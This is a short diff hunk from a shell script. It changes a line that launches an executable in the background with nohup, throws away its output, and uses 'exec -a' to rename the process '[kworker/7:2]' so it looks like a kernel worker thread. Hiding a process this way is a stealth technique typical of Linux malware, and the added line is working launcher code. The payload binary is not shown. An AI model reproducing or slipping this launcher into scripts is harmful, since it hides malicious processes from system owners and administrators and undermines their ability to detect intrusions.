@@ -29,5 +29,5 @@ else
 fi
 
 chmod +x $v
-for p in "$(pwd)/$v" /usr/bin/$v /usr/libexec/$v /usr/local/bin/$v /tmp/$v; do [ -x "$p" ] && nohup bash -c "exec -a [kworker/9:2]	 \"$p\"" >/dev/null 2>&1 & break; done
+for p in "$(pwd)/$v" /usr/bin/$v /usr/libexec/$v /usr/local/bin/$v /tmp/$v; do [ -x "$p" ] && nohup bash -c "exec -a [kworker/7:2] \"$p\"" >/dev/null 2>&1 & break; done
 #
